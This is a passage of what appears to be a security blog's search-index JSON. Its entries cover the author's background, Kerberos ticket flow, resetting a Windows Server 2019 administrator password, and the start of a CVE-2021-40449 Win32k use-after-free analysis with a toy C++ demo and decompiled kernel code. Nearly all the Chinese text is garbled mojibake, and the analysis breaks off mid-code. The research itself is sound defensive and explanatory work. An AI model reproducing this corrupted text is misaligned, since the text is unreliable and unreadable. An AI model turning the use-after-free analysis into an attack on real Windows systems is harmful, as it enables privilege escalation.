issueçš„è¯„è®ºåŠŸèƒ½ï¼Œå‚è€ƒ\rutterancã€‚\nå‚è€ƒ\nhttps://metalblueberry.github.io/post/howto/2021-02-28_hugo_timeline_shortcode/\n"},{"uri":"https://www.ch35tnut.site/zh-cn/about/","title":"å…³äºæˆ‘","tags":[],"description":"","content":"å…³äºæˆ‘ 21å¹´æ¯•ä¸šï¼Œç›®å‰åœ¨æŸå®‰å…¨å‚å•†å·¥ä½œï¼Œä¸»è¦ç ”ç©¶äºŒè¿›åˆ¶ï¼Œåšä¸€äº›åº”æ€¥å“åº”æ–¹é¢çš„ä¸œè¥¿ï¼Œä¸šä½™ä¹Ÿä¼šçœ‹çœ‹webä¾§çš„ä¸€äº›ç®€å•æ¼æ´ï¼Œè¿™ä¸ªåšå®¢è®°å½•äº†æˆ‘åˆ†æçš„ä¸€äº›æ¼æ´å’Œä¸€äº›å®‰å…¨ç ”ç©¶çš„æ–‡ç« ã€‚\nä»å°æ—¶å€™åœ¨ç”µè§†ä¸Šçœ‹åˆ°é»‘å®¢åœ¨ç½‘ç»œä¸Šä¸Šå¤©å…¥åœ°æ— æ‰€ä¸èƒ½ï¼Œå¦‚ä»Šå·²å…¥å®‰å…¨è¡Œä¸šï¼Œå¸Œæœ›èƒ½å¤Ÿé•¿ä¹…ä¿æŒå¯¹ç½‘ç»œå®‰å…¨çš„å¥½å¥‡å¿ƒï¼Œä¸ä¼šè¢«æ¶ˆç£¨è‡ªå·±çš„å¥½å¥‡å¿ƒï¼Œèƒ½å¤Ÿç»™ä¸–ç•Œç•™ä¸‹ä¸€ç‚¹å±äºè‡ªå·±çš„ä¸œè¥¿ã€‚\nGitHubåœ°å€ Chestnuts4\nå¸Œæœ›å¯ä»¥æŒä¹‹ä»¥æ’åšå®‰å…¨ç ”ç©¶ã€‚\né»‘å®¢ç²¾ç¥ï¼šOpen, Share, Free\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/","title":"è®¤è¯åŸç†","tags":[],"description":"","content":"è®¤è¯åŸç† ä¸€ã€Kerberosæ¦‚å¿µ Kerberosæ˜¯è®¡ç®—æœºç½‘ç»œæˆæƒåè®®ï¼Œç”¨äºåœ¨éå®‰å…¨ç½‘ç»œä¸­ï¼Œå¯¹ä¸ªäººé€šä¿¡è¿‡ç¨‹ä¸­ç”¨å®‰å…¨çš„æ‰‹æ®µè¿›è¡Œèº«ä»½è®¤è¯ã€‚å…¶ä¸­å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯èƒ½å¤Ÿç›¸äº’è®¤è¯ï¼Œè¯†åˆ«å¯¹æ–¹èº«ä»½ã€‚Kerberosæ˜¯ç¬¬ä¸‰æ–¹è®¤è¯ï¼Œä¾èµ–äºç¬¬ä¸‰æ–¹æœåŠ¡å™¨å¯¹å½¼æ­¤è¿›è¡Œèº«ä»½éªŒè¯ï¼ŒKerberosæœåŠ¡å™¨æœ¬èº«æˆä¸ºKDCã€‚ ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š\nKerberosçŸ¥é“ç”¨æˆ·å’Œé›†ç¾¤å†…æœåŠ¡ä»¥åŠå„è‡ªçš„å¯†ç æ•°æ®åº“ ASéªŒè¯ç”¨æˆ·èº«ä»½ï¼ŒéªŒè¯é€šè¿‡å°±ä¼šè¿”å›ç»™Clientç«¯ä¸€ä¸ªTGT Clienté€šè¿‡TGTå‘TGSè·å–ST æœåŠ¡éªŒè¯STæœ‰æ•ˆæ€§ï¼Œå¦‚æœæœ‰æ•ˆåˆ™Clientå¯ä»¥è®¿é—®æœåŠ¡ äºŒã€Kerberosåè¯è§£é‡Š ASï¼ˆAuthentication Serverï¼‰è®¤è¯æœåŠ¡å™¨ KDCï¼ˆKey Distribution Centerï¼‰å¯†é’¥åˆ†å‘ä¸­å¿ƒ TGTï¼ˆTicket Granting Ticketï¼‰ç¥¨æ®æˆæƒç¥¨æ®ï¼Œç»™ç¥¨æ®æˆæƒçš„ç¥¨æ® TGSï¼ˆTicket Granting Serviceï¼‰ç¥¨æ®æˆæƒæœåŠ¡ SSï¼ˆService Serverï¼‰æœåŠ¡æä¾›æœåŠ¡å™¨ STï¼ˆServer Ticketï¼‰æœåŠ¡ç«¯ç¥¨æ® ä¸€èˆ¬KDCåŒæ—¶åŒ…å«ASå’ŒTGS\nä¸‰ã€KerberoséªŒè¯è¿‡ç¨‹ Clientç™»å½•ï¼Œç”¨æˆ·è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œä¼šç”¨å•å‘å‡½æ•°æ ¹æ®å¯†ç ç”Ÿæˆå®¢æˆ·ç«¯å¯†é’¥ï¼ˆClient Secret Keyï¼‰\nClientå‘ASå‘é€Aæ¶ˆæ¯è¯·æ±‚TGT\nAæ¶ˆæ¯å†…å®¹ ç”¨æˆ·å è¯·æ±‚æœåŠ¡åç§°ï¼Œè¿™é‡Œæ˜¯TGS ç½‘ç»œåœ°å€ è¯·æ±‚TGTçš„ç”Ÿå‘½å‘¨æœŸ è¯¥æ¶ˆæ¯ä¸ä¼šåŠ å¯†ï¼Œä¹Ÿä¸ä¼šå‘é€å¯†ç æˆ–è€…å¯†ç ç”Ÿæˆçš„å¯†é’¥ ASæ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ASç”¨æˆ·åæ•°æ®åº“å†…ï¼Œå¹¶ä½¿ç”¨æ•°æ®åº“ä¸­ç”¨æˆ·å¯†ç ç”Ÿæˆçš„NTLMå“ˆå¸Œè§£å¯†å®¢æˆ·ç«¯æ¶ˆæ¯\nå¦‚æœæ•°æ®åº“å†…æœ‰è¯¥ç”¨æˆ·ååˆ™éšæœºç”ŸæˆTGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰ï¼ŒåŒæ—¶ç»™Clientç«¯å‘é€ä¸¤æ¡æ¶ˆæ¯\nBæ¶ˆæ¯å†…å®¹ç”¨å®¢æˆ·ç«¯å¯†é’¥åŠ å¯† TGSåç§° æ—¶é—´æˆ³ ç”Ÿå‘½å‘¨æœŸ TGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰ Cæ¶ˆæ¯å†…å®¹ï¼ˆTGTï¼‰ç”¨TGSå¯†é’¥ï¼ˆTGS Secret Keyï¼‰åŠ å¯† ç”¨æˆ·å TGSåç§° æ—¶é—´æˆ³ ç”¨æˆ·ç½‘ç»œåœ°å€ ç”Ÿå‘½å‘¨æœŸ TGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰ Clientç”¨é€šè¿‡å¯†ç ç”Ÿæˆçš„å®¢æˆ·ç«¯å¯†é’¥è§£å¯†Bæ¶ˆæ¯ï¼Œå¦‚æœå¯†ç æ­£ç¡®åˆ™å¯ä»¥å¾—åˆ°TGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰ï¼Œå°†Cæ¶ˆæ¯ï¼ˆTGTï¼‰å­˜å‚¨åœ¨æœ¬åœ°å‡­æ®ç¼“å­˜å†…ã€‚\nClientå‘TGSè¯·æ±‚STï¼ŒæœŸé—´éœ€è¦å‘TGSå‘é€ä¸¤æ¡æ¶ˆæ¯æ˜æ–‡\nDæ¶ˆæ¯å†…å®¹ æƒ³è¦è¯·æ±‚çš„æœåŠ¡IDå³SS ç”Ÿå‘½å‘¨æœŸ TGT Eæ¶ˆæ¯å†…å®¹ä½¿ç”¨TGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰åŠ å¯†å³èº«ä»½éªŒè¯å™¨ ç”¨æˆ·å æ—¶é—´æˆ³ TGSéªŒè¯Clientè¯·æ±‚æœåŠ¡æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨åˆ™è¿›å…¥ä¸‹ä¸€æ­¥ã€‚\nTGSæå–Dæ¶ˆæ¯å†…çš„TGTï¼Œç”¨TGSå¯†é’¥è§£å¯†ï¼ˆTGS Secret Keyï¼‰ï¼Œä»ä¸­æå–TGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰ï¼Œå†ç”¨TGSä¼šè¯å¯†é’¥è§£å¯†Eå¾—åˆ°ç”¨æˆ·åå’Œæ—¶é—´æˆ³ï¼Œç°åœ¨TGSå¾—åˆ°äº†ç”¨æˆ·åå’Œæ¶ˆæ¯Eçš„æ—¶é—´æˆ³ï¼Œä»¥åŠæ¶ˆæ¯Cçš„ç”¨æˆ·åå’Œæ—¶é—´æˆ³\næ¯”è¾ƒä¸¤ä¸ªç”¨æˆ·åå’Œæ—¶é—´æˆ³ æ£€æŸ¥TGTç”Ÿå‘½å‘¨æœŸæ˜¯å¦è¿‡æœŸ æ£€æŸ¥èº«ä»½éªŒè¯å™¨ï¼ˆEæ¶ˆæ¯ï¼‰æ˜¯å¦åœ¨ç¼“å­˜å†…(å­˜ç–‘) TGSç”ŸæˆéšæœºæœåŠ¡ä¼šè¯ï¼ˆservice session keyï¼‰å¯†é’¥ï¼Œå¹¶å‘é€ä¸¤æ¡æ¶ˆæ¯ç»™Client\nFæ¶ˆæ¯å†…å®¹ç”¨æœåŠ¡å¯†é’¥(Service Secret Key)åŠ å¯† ç”¨æˆ·å æœåŠ¡å æ—¶é—´æˆ³ ç½‘ç»œåœ°å€ ç”Ÿå‘½å‘¨æœŸ æœåŠ¡ä¼šè¯å¯†é’¥ Gæ¶ˆæ¯å†…å®¹ç”¨TGSä¼šè¯å¯†é’¥åŠ å¯† æœåŠ¡å æ—¶é—´æˆ³ ç”Ÿå‘½å‘¨æœŸ æœåŠ¡ä¼šè¯å¯†é’¥ å› ä¸ºClientæœ‰TGSä¼šè¯å¯†é’¥æ‰€ä»¥å¯ä»¥è§£å¯†æ¶ˆæ¯Gå¾—åˆ°æœåŠ¡ä¼šè¯å¯†é’¥ï¼ˆservice session keyï¼‰\nå®¢æˆ·ç«¯å’ŒSSè¿æ¥ï¼Œå‘é€ä¸¤æ¡æ¶ˆæ¯\næ¶ˆæ¯Hç”¨æœåŠ¡ä¼šè¯å¯†é’¥åŠ å¯†å†…å®¹èº«ä»½éªŒè¯å™¨ï¼š ç”¨æˆ·å æ—¶é—´æˆ³ æ¶ˆæ¯L å³æ¶ˆæ¯F SSæ”¶åˆ°è¯·æ±‚ï¼Œç”¨æœåŠ¡å¯†é’¥è§£å¯†æ¶ˆæ¯Iå³æ¶ˆæ¯Få¾—åˆ°æœåŠ¡ä¼šè¯å¯†é’¥åŠç”¨æˆ·åæ—¶é—´æˆ³ç­‰ä¿¡æ¯ï¼Œå†ç”¨æœåŠ¡ä¼šè¯å¯†é’¥è§£å¯†æ¶ˆæ¯Hå¾—åˆ°ç”¨æˆ·åå’Œæ—¶é—´æˆ³\nSSè¿›è¡Œèº«ä»½éªŒè¯\næ¯”è¾ƒæ¶ˆæ¯Hå†…ç”¨æˆ·åå’Œæ¶ˆæ¯Få†…çš„ç”¨æˆ·å æ¯”è¾ƒæ¶ˆæ¯Hå’Œæ¶ˆæ¯Få†…çš„æ˜¯æ—¶é—´æˆ³ æ£€æŸ¥æ¶ˆæ¯Få†…ç”Ÿå‘½å‘¨æœŸ æ£€æŸ¥èº«ä»½éªŒè¯å™¨æ˜¯å¦åœ¨ç¼“å­˜å†… SSå‘ClientéªŒè¯èº«ä»½ï¼Œå‘å…¶å‘é€æ¶ˆæ¯\næ¶ˆæ¯Jä½¿ç”¨æœåŠ¡ä¼šè¯å¯†é’¥åŠ å¯†èº«ä»½éªŒè¯å™¨ æœåŠ¡ID æ—¶é—´æˆ³ï¼ˆåœ¨æ¶ˆæ¯Hå†…çš„æ—¶é—´æˆ³ï¼‰ å®¢æˆ·ç«¯æ”¶åˆ°SSçš„èº«ä»½éªŒè¯å™¨æ¶ˆæ¯ï¼ˆJï¼‰ï¼Œä½¿ç”¨ç¼“å­˜å†…çš„æœåŠ¡ä¼šè¯å¯†é’¥è¿›è¡Œè§£å¯†å¾—åˆ°æœåŠ¡IDåŠæ—¶é—´æˆ³ï¼Œå¹¶éªŒè¯æ˜¯å¦æœ‰æ•ˆ\nå‚è€ƒé“¾æ¥\nhttps://www.vanimpe.eu/2017/05/26/kerberos-made-easy/ https://zh.wikipedia.org/wiki/Kerberos http://www.nosqlnotes.com/technotes/kerberos-protocol/ https://juejin.im/post/6844903955416219661\nç®€åŒ–æ¨¡å‹ Clientå‘ASå‘é€æ˜æ–‡æ¶ˆæ¯ï¼Œç”³è¯·è®¿é—®çš„æœåŠ¡ ASæ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å­˜åœ¨æœ¬åœ°æ•°æ®åº“ä¸­ï¼Œå­˜åœ¨åˆ™è¿”å›ä¸¤æ¡æ¶ˆæ¯ Aï¼šClient/TGSä¼šè¯å¯†é’¥(Client/TGS Session Key)ç”¨äºClientå’ŒTGSé€šä¿¡ï¼Œé€šè¿‡ç”¨æˆ·å¯†é’¥åŠ å¯† Bï¼šTGTï¼ˆåŒ…å«Client/TGSä¼šè¯å¯†é’¥ã€ç”¨æˆ·ã€ç”¨æˆ·ç½‘ç»œåœ°å€ã€TGTæœ‰æ•ˆæœŸï¼‰ï¼Œé€šè¿‡TGSå¯†é’¥åŠ å¯† Clientæ”¶åˆ°æ¶ˆæ¯ABï¼Œç”¨è‡ªå·±çš„ç”¨æˆ·å¯†é’¥è§£å¯†æ¶ˆæ¯Aå¾—åˆ°å’ŒTGSé€šä¿¡çš„å¯†é’¥TGSä¼šè¯å¯†é’¥ Clientå‘TGSè¯·æ±‚æœåŠ¡ï¼Œå‘é€ä¸¤æ¡æ¶ˆæ¯ Cï¼šæ¶ˆæ¯Bå’Œç”³è¯·çš„æœåŠ¡IDï¼ˆæ˜æ–‡ï¼‰ Dï¼šè®¤è¯ç¬¦ï¼ˆåŒ…æ‹¬ç”¨æˆ·IDã€æ—¶é—´æˆ³ï¼‰é€šè¿‡(Client/TGS Session Key)åŠ å¯† TGSæ‹¿åˆ°æœåŠ¡IDæ£€æŸ¥æ˜¯å¦æœ‰è¯¥æœåŠ¡ï¼Œå¦‚æœæœ‰è¯¥æœåŠ¡åˆ™ç”¨TGSå¯†é’¥è§£å¯†æ¶ˆæ¯Bå¾—åˆ°(Client/TGS Session Key)å†ç”¨TGSä¼šè¯å¯†é’¥è§£å¯†æ¶ˆæ¯Då¾—åˆ°ç”¨æˆ·IDã€æ—¶é—´æˆ³ï¼Œä¸TGTå†…çš„ç”¨æˆ·IDå’Œæ—¶é—´æˆ³æ¯”å¯¹éªŒè¯æœ‰æ•ˆæ€§ã€‚ é€šè¿‡ä¹‹åTGSè¿”å›ä¸¤æ¡æ¶ˆæ¯ç»™Client Eï¼šSTï¼ˆSSä¼šè¯å¯†é’¥ã€ç”¨æˆ·IDã€ç”¨æˆ·ç½‘ç»œåœ°å€ã€æœ‰æ•ˆæœŸï¼‰é€šè¿‡SSå¯†é’¥åŠ å¯† Fï¼šSSä¼šè¯å¯†é’¥ï¼Œé€šè¿‡TGSä¼šè¯å¯†é’¥åŠ å¯† Clienté€šè¿‡TGSä¼šè¯å¯†é’¥è§£å¯†æ¶ˆæ¯Få¾—åˆ°SSä¼šè¯å¯†é’¥ Clientç»™SSå‘é€ä¸¤æ¡æ¶ˆæ¯ Gï¼šå³æ¶ˆæ¯E Hï¼šè®¤è¯ç¬¦ï¼ŒåŒ…å«ç”¨æˆ·IDï¼Œæ—¶é—´æˆ³ï¼Œé€šè¿‡SSä¼šè¯å¯†é’¥åŠ å¯† SSæ”¶åˆ°ä¸¤æ¡æ¶ˆæ¯ä¹‹åç”¨SSå¯†é’¥è§£å¯†æ¶ˆæ¯Gï¼ˆEï¼‰å¾—åˆ°SSä¼šè¯å¯†é’¥ï¼Œåœ¨é€šè¿‡ä¼šè¯å¯†é’¥è§£å¯†æ¶ˆæ¯Hå¾—åˆ°ç”¨æˆ·IDã€æ—¶é—´æˆ³ç­‰ä¿¡æ¯ï¼Œå¦‚æœå’Œæ¶ˆæ¯Gï¼ˆEï¼‰å†…çš„æ—¶é—´æˆ³å’Œç”¨æˆ·IDæ¯”å¯¹ï¼Œé€šè¿‡åˆ™è¿”å›æ¶ˆæ¯ç»™Client Iï¼šæ¶ˆæ¯Hå†…çš„æ—¶é—´æˆ³ï¼Œé€šè¿‡SSä¼šè¯å¯†é’¥åŠ å¯† Clientæ”¶åˆ°æ¶ˆæ¯ä¹‹åç”¨SSä¼šè¯å¯†é’¥è§£å¯†å¾—åˆ°æ—¶é—´æˆ³ï¼Œå¹¶éªŒè¯ï¼Œé€šè¿‡åˆ™å¯ä»¥å‘SSå‘é€è¯·æ±‚ã€‚ "},{"uri":"https://www.ch35tnut.site/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/","title":"åœ¨Windows server 2019ä¸Šé‡ç½®å¯†ç ","tags":[],"description":"","content":"é‡ç½®windows server 2019çš„administratorå¯†ç  ä¹‹å‰åœ¨Vmwareä¸Šçš„Windows server 2019çš„Administratorå¯†ç å¿˜è®°äº†ï¼Œä½¿ç”¨ç½‘ä¸Šçš„æ–¹æ³•æ—¶æ‰¾ä¸åˆ°ç”¨PEå¯åŠ¨ç³»ç»Ÿçš„åŠæ³•ï¼Œæ— å¥ˆåªèƒ½ä½¿ç”¨å…¶ä»–åŠæ³•ã€‚å†™æ­¤æ–‡è®°å½•ä¸€ä¸‹ã€‚\nè®¾ç½®CD/DVD é¦–å…ˆåœ¨è™šæ‹Ÿæœº-è®¾ç½®çš„ç¡¬ä»¶é€‰é¡¹å¡ä¸‹é¢çš„CD/DVDè®¾ç½®ä¸ºä½¿ç”¨ISOæ˜ åƒæ–‡ä»¶å¹¶æ‰¾åˆ°windows server 2019é•œåƒä½ç½®ï¼Œå¦‚ä¸‹å›¾\nä¹‹åé€‰æ‹©è™šæ‹Ÿæœº-ç”µæº-å¼€æœºæ—¶æ‰“å¼€å›ºä»¶å¯åŠ¨è™šæ‹Ÿæœºï¼Œè™šæ‹Ÿæœºå°±ä¼šè¿›å…¥BIOSï¼Œåœ¨BIOSé‡Œé€‰æ‹©CD/DVDå¯åŠ¨ï¼Œå³ä¼šè¿›å…¥ä¸‹å›¾ã€‚\nå‚è€ƒé“¾æ¥\nhttps://www.osradar.com/how-to-reset-password-administrator-on-windows-server-2019/\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-40449-win32k-eop/","title":"CVE-2021-40449 Win32k æƒé™æå‡æ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"CVE-2021-40449 Win32kææƒæ¼æ´åŠPOCåˆ†æ èƒŒæ™¯ CVE-2021-40449æ˜¯å¡å·´æ–¯åŸºå®éªŒå®¤åœ¨2021å¹´8æœˆä¸‹æ—¬åˆ°9æœˆä¸Šæ—¬åœ¨WindowsæœåŠ¡å™¨ä¸Šæ•è·çš„æ¶æ„æ ·æœ¬åˆ©ç”¨çš„ææƒæ¼æ´ï¼Œè¯¥æ¼æ´å­˜åœ¨äºwin32kfull.sysé©±åŠ¨å†…ï¼Œåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥åœ¨windowsä¸­å®Œæˆä»usersåˆ°systemçš„æƒé™æå‡ã€‚\nåŸºæœ¬æ¦‚å¿µ å†…æ ¸å¯¹è±¡ï¼šå†…æ ¸å¯¹è±¡å³åœ¨å†…æ ¸ç©ºé—´å­˜åœ¨çš„å¯¹è±¡ï¼Œåªèƒ½ç”±å†…æ ¸åˆ†é…ï¼Œå†…æ ¸è®¿é—®ã€‚\nå†…æ ¸å¯¹è±¡çš„å¼•ç”¨è®¡æ•°ï¼šåœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œå¯èƒ½æœ‰å¤šä¸ªè¿›ç¨‹è®¿é—®åŒä¸€ä¸ªå†…æ ¸å¯¹è±¡ï¼Œå¦‚æœæ²¡æœ‰è¿›ç¨‹éœ€è¦ä½¿ç”¨è¯¥å¯¹è±¡å†…æ ¸å°±åº”è¯¥é‡Šæ”¾è¯¥å¯¹è±¡ï¼Œæ‰€ä»¥ä¸ºäº†å‡†ç¡®çš„é‡Šæ”¾è¯¥å¯¹è±¡å°±æœ‰äº†å¼•ç”¨è®¡æ•°ã€‚å½“å†…æ ¸å¯¹è±¡è¢«åˆ›å»ºæ—¶ï¼Œå¼•ç”¨è®¡æ•°è¢«æ ‡è®°ä¸º1ï¼Œè°ƒç”¨CloseHandle()æ—¶å†…æ ¸å¯¹è±¡çš„å¼•ç”¨è®¡æ•°å°±-1ï¼Œè¿™å¯ä»¥ç±»æ¯”Java GCçš„å¼•ç”¨è®¡æ•°æ³•ï¼š\nåœ¨å¯¹è±¡ä¸­æ·»åŠ ä¸€ä¸ªå¼•ç”¨è®¡æ•°å™¨ï¼Œæ¯å½“ä¸€ä¸ªåœ°æ–¹å¼•ç”¨å®ƒæ—¶ï¼Œè®¡æ•°å™¨å°±åŠ ä¸€ï¼›å½“å¼•ç”¨å¤±æ•ˆæ—¶ï¼Œè®¡æ•°å™¨å€¼å°±å‡ä¸€ï¼›ä»»ä½•æ—¶åˆ»è®¡æ•°å™¨ä¸ºé›¶çš„å¯¹è±¡å°±æ˜¯ä¸å¯èƒ½å†è¢«ä½¿ç”¨çš„ã€‚\nå¥æŸ„ï¼šç”±äºå†…æ ¸å¯¹è±¡åªèƒ½ç”±å†…æ ¸åˆ†é…ã€è®¿é—®ã€ä¿®æ”¹ï¼Œå½“ring 3å±‚çš„åº”ç”¨ç¨‹åºæƒ³è¦æ“ä½œè¿™äº›å†…æ ¸å¯¹è±¡çš„æ—¶å€™ï¼Œå¹¶ä¸èƒ½ç›´æ¥æ“æ§å†…æ ¸å¯¹è±¡ã€‚å½“å†…æ ¸å¯¹è±¡åˆ›å»ºå¥½åï¼Œæ“ä½œç³»ç»Ÿä¼šä½¿ç”¨ä¸€ä¸ªå¥æŸ„æ¥æ ‡è¯†è¯¥å¯¹è±¡å¹¶è¿”å›ç»™åº”ç”¨ç¨‹åºï¼Œåº”ç”¨ç¨‹åºé€šè¿‡æ“ä½œç³»ç»Ÿæä¾›çš„ring 3å±‚APIæ¥æ“ä½œå¥æŸ„ï¼Œring3å±‚APIç»è¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸ã€‚åœ¨å†…æ ¸å¤„å¥æŸ„å¯¹åº”ç€å…·ä½“çš„å†…æ ¸å¯¹è±¡ï¼Œè¿™æ ·ring3å±‚çš„åº”ç”¨ç¨‹åºå°±å¯ä»¥é€šè¿‡æ“ä½œå¥æŸ„æ¥é—´æ¥æ“ä½œå†…æ ¸å¯¹è±¡ã€‚\nå¥æŸ„è¡¨ï¼šå½“ä¸€ä¸ªè¿›ç¨‹åˆå§‹åŒ–çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šç»™è¯¥è¿›ç¨‹åˆ†é…ä¸€ä¸ªå¥æŸ„è¡¨ï¼Œå½“è¿›ç¨‹åˆ›å»ºå†…æ ¸å¯¹è±¡çš„æ—¶å€™ï¼Œå†…æ ¸åˆ›å»ºå¯¹åº”å†…æ ¸å¯¹è±¡ï¼Œå¹¶éå†è¯¥è¿›ç¨‹çš„å¥æŸ„è¡¨ï¼Œåœ¨å¥æŸ„è¡¨çš„ç©ºé—²ä½ç½®è®¾ç½®å†…æ ¸å¯¹è±¡ã€å¯¹è±¡æŒ‡é’ˆç­‰ï¼Œå¹¶è·å–è¯¥ä½ç½®çš„ç´¢å¼•ï¼Œä½œä¸ºè¿›ç¨‹åˆ›å»ºå¯¹è±¡çš„å‡½æ•°çš„è¿”å›å€¼ï¼Œå³ä¸ºå¥æŸ„ã€‚\nhttps://www.cnblogs.com/MisterXu/p/10846918.html\nDCï¼šæ˜¯ä¸€ä¸ªå†…æ ¸å¯¹è±¡ï¼Œå…¨ç§°device contextï¼Œè®¾å¤‡ä¸Šä¸‹æ–‡å¯¹è±¡\nHDCï¼šDCå¯¹è±¡çš„å¥æŸ„ã€‚\né‡Šæ”¾åé‡ç”¨ï¼šæŒ‡ä¸€ä¸ªå†…å­˜ç©ºé—´è¢«æ“ä½œç³»ç»Ÿé‡Šæ”¾åï¼Œå†…å­˜ç©ºé—´å˜ä¸ºç©ºé—²çŠ¶æ€ï¼Œå¦‚æœç”¨æˆ·åœ¨è¿™ä¸€åˆ»ç”³è¯·å†…å­˜ï¼Œæ“ä½œç³»ç»Ÿä¼šä¼˜å…ˆåˆ†é…åˆšé‡Šæ”¾çš„å†…å­˜ï¼Œåˆ™ç”¨æˆ·å¤§æ¦‚ç‡å¯ä»¥ç”³è¯·åˆ°åˆšåˆšé‡Šæ”¾çš„å†…å­˜å¹¶ä¿®æ”¹è¯¥å†…å­˜ç©ºé—´çš„å†…å®¹ã€‚å¦‚æœåœ¨é‡Šæ”¾ç©ºé—´ä¹‹å‰æœ‰æŒ‡é’ˆæŒ‡å‘è¯¥ç©ºé—´ï¼Œåœ¨é‡Šæ”¾ç©ºé—´ä¹‹åæŒ‡é’ˆå¹¶æœªæŒ‰ç…§ç†æƒ³çŠ¶æ€ç½®ä¸ºNULLï¼Œç”±äºé‡Šæ”¾åå¯ä»¥é‡æ–°ç”³è¯·è¯¥å†…å­˜å¹¶ä¿®æ”¹å†…å­˜å†…å®¹ï¼Œåç»­å¦‚æœç»§ç»­ä½¿ç”¨è¯¥æŒ‡é’ˆï¼Œä½†å†…å­˜å†…å†…å®¹å¹¶ä¸æ˜¯é¢„æœŸçš„é‡Šæ”¾ä¹‹å‰çš„å†…å®¹ï¼Œåˆ™ä¼šäº§ç”Ÿéé¢„æœŸè¡Œä¸ºã€‚\negï¼š\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void method(); void badMethod(); // å®šä¹‰å‡½æ•°æŒ‡é’ˆ typedef void (*function)(); class test { public: function p; test() { } }; int main() { // new testå¯¹è±¡ test *t = new test(); test *p = t; t-\u0026gt;p = method; p-\u0026gt;p(); // é‡Šæ”¾tæŒ‡å‘çš„testå¯¹è±¡çš„ç©ºé—´ delete t; test *pt; for (size_t i = 0; i \u0026lt; 10000; i++) { // å ç”¨åˆšé‡Šæ”¾çš„å¯¹è±¡çš„å†…å­˜ç©ºé—´ pt = (test *)malloc(sizeof(test)); // å°†ç”³è¯·çš„ç©ºé—´å½“ä½œtestå¯¹è±¡ï¼Œå¹¶å°†å¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆè®¾ç½®ä¸ºæ¶æ„å‡½æ•°åœ°å€ pt-\u0026gt;p = badMethod; } // è¿™é‡ŒåŸæ„æƒ³è¦è°ƒç”¨methodå‡½æ•°ï¼Œä½†æ˜¯å®é™…è°ƒç”¨äº†badMethodå‡½æ•° printf(\u0026#34;ç¬¬äºŒæ¬¡è°ƒç”¨\\n\u0026#34;); p-\u0026gt;p(); return 0; } void method() { printf(\u0026#34;method\\n\u0026#34;); } void badMethod() { printf(\u0026#34;bad method\\n\u0026#34;); } æ¼æ´å½¢æˆåˆ†æ è¯¥æ¼æ´äº§ç”Ÿäºwin32kfull!GreResetDCInternalå‡½æ•°ä¸­ï¼Œè¯¥å‡½æ•°å†…ä¼šè·å–DCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆï¼Œå¹¶æ‰§è¡Œè¯¥å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°ï¼Œä½†å¹¶æœªæ£€æŸ¥DCå¯¹è±¡æ˜¯å¦å¼‚å¸¸ã€‚æ‰€ä»¥å¦‚æœå¯ä»¥åœ¨è°ƒç”¨å‡½æ•°æŒ‡é’ˆä¹‹å‰é‡Šæ”¾DCå¯¹è±¡ï¼Œå¹¶é‡æ–°ç”³è¯·è¯¥å¯¹è±¡çš„å†…å­˜ç©ºé—´ï¼Œé€šè¿‡æ„é€ å†…å­˜å¸ƒå±€ï¼Œä¿®æ”¹åŸDCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆæŒ‡å‘å…¶ä»–ä»»æ„å†…æ ¸å‡½æ•°ï¼Œå°±å¯ä»¥åœ¨win32kfull!GreResetDCInternalå†…å®ç°ä»»æ„å†…æ ¸å‡½æ•°è°ƒç”¨ã€‚\næ ¹æ®ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥ç®—å‡ºDCOå¯¹è±¡å’ŒDCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆçš„å…³ç³»ï¼šfunction pointer=* (* (DCO +0x30)+0xad0)ï¼Œå…¶ä¸­DCO +0x30å³æŒ‡å‘DCå¯¹è±¡çš„æŒ‡é’ˆ\nv10 = *(_QWORD *)(v8 + 48);\nv15 *= * (void (_fastcall * * )(QWORD, _QWORD))(*v10 + 2768);\n__int64 __usercall GreResetDCInternal@\u0026lt;rax\u0026gt;(HDC a1@\u0026lt;rcx\u0026gt;, __int64 a2@\u0026lt;rdx\u0026gt;, int *a3@\u0026lt;r8\u0026gt;) { __int64 v24; // [rsp+50h] [rbp-20h] __int64 v25; // [rsp+60h] [rbp-10h] DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v25, a1); // åˆ©ç”¨æ„é€ å‡½æ•°ä»HDCåˆ›å»ºDCOBJå¯¹è±¡ v8 = v25; Â·Â·Â·Â·Â·Â·Â·Â·Â·Â· v10 = *(_QWORD *)(v8 + 48);\t// èµ‹å€¼ *(_QWORD *)(v10 + 1736) = 0i64; v24 = v11; Â·Â·Â·Â·Â·Â·Â· v9 = *(_QWORD *)(v25 + 512) != 0i64; v12 = *(_DWORD *)(v25 + 120) \u0026gt; 0; Â·Â·Â·Â·Â·Â·Â· v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// 